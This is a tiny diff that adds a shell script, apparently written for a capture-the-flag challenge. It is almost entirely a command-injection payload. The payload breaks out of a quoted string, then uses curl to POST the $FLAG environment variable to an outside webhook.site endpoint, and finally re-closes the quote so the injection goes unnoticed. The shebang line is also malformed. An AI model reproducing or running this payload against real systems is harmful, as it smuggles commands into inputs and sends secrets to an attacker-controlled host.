@@ -1,0 +1,2 @@
+#!bin/sh
+"; curl -X POST -H flag:$FLAG https://webhook.site/bc7c7ee3-ca0e-4ac4-aacc-22e0015c0ea6; echo "
